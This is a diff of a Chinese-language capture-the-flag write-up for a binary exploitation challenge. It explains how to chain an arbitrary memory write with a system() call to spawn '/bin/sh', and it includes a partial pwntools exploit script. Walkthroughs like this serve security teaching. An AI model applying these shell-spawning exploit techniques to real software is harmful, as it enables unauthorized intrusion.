@@ -219,11 +219,11 @@ flag: `sun{ju57_4n07h3r_5ql1_ch4ll}`
 
 这道题每个功能都有一些可以利用的点，"tombstone_piledriver " 读文件，可以查看 /proc/self/map 获取程序基址（没什么用）"old_school " 忘内存写任意内容（关键），"last_ride "  执行system() (关键)，"chokeslam " 往输入缓冲区写东西，在后面使用其他功能的时候，只要没有新的数据覆盖，这些数据仍然存在的。根据程序里面的 TODO 也能知道一些。
 
-关键在于 `memcpy(&dest, a1, 0x14uLL);` 要是 dest 就方便很多。
+关键在于 `memcpy(&dest, a1, 0x14uLL);` 
 
-根据题意，想到的 chain 就是 "old_school "->"old_school "->"last_ride  “，第一次写入 “/bin/sh" 得到第一个地址，第二次写入第一次的地址，第三次把第二次的传给"last_ride  “，从而构造 system(”/bin/sh")
+~~根据题意，想到的 chain 就是 "old_school "->"old_school "->"last_ride  “，第一次写入 “/bin/sh" 得到第一个地址，第二次写入第一次的地址，第三次把第二次的传给"last_ride  “，从而构造 system(”/bin/sh")~~ 
 
-实际操作还是很多问题的，注意退出"old_school "的时候不要选 “n"，其他随便字符都可以，"old_school "有\x00截断，第一次返回的地址有前导'\x00'，可以对地址进行 +x 的操作，其次 "last_ride  “ 中会多拷贝地址后的 "00" 导致执行 system 执行时不能访问对应的内存。尝试把第一次产生的地址传给它，成功 getshell（？） 其实最迷的是如果不进行第二次 mmap，直接传第一次地址，会使 rdi = ”/bin/sh" ,而不是 rdi->”/bin/sh" 按照对于memcpy 的理解也应该是这样，而进行二次mmap 后反倒是前面的操作可行了。
+实际操作还是很多问题的，注意退出"old_school "的时候不要选 “n"，其他随便字符都可以，"old_school "有\x00截断，第一次返回的地址有前导'\x00'，可以对地址进行 +x 的操作，其次 "last_ride  “ 中会多拷贝地址后的 "00" 导致执行 system 执行时不能访问对应的内存。把产生的地址传给它，成功 getshell . 注意 \x00 可能会导致传址失败，导致 buffer 里面还是  bin/sh 
 
 ```python
 from pwn import *
@@ -242,14 +242,14 @@ sh.recvuntil("Jump to shellcode?\n")
 #sh.recvline()
 sh.sendline("c")
 
-sh.recvuntil("Move?\n> ")
-sh.sendline("old_school "+p64(shellcode_addr)+"\0\0")
+#sh.recvuntil("Move?\n> ")
+#sh.sendline("old_school "+p64(shellcode_addr)+"\0\0")
 #sh.recvline()
 shellcode_addr2 = int(sh.recvline()[-16:-2],16)
 
-sh.recvuntil("Jump to shellcode?\n")
+#sh.recvuntil("Jump to shellcode?\n")
 #sh.recvline()
-sh.sendline("c")
+#sh.sendline("c")
 
 #gdb.attach(sh)
 sh.recvuntil("Move?\n> ")
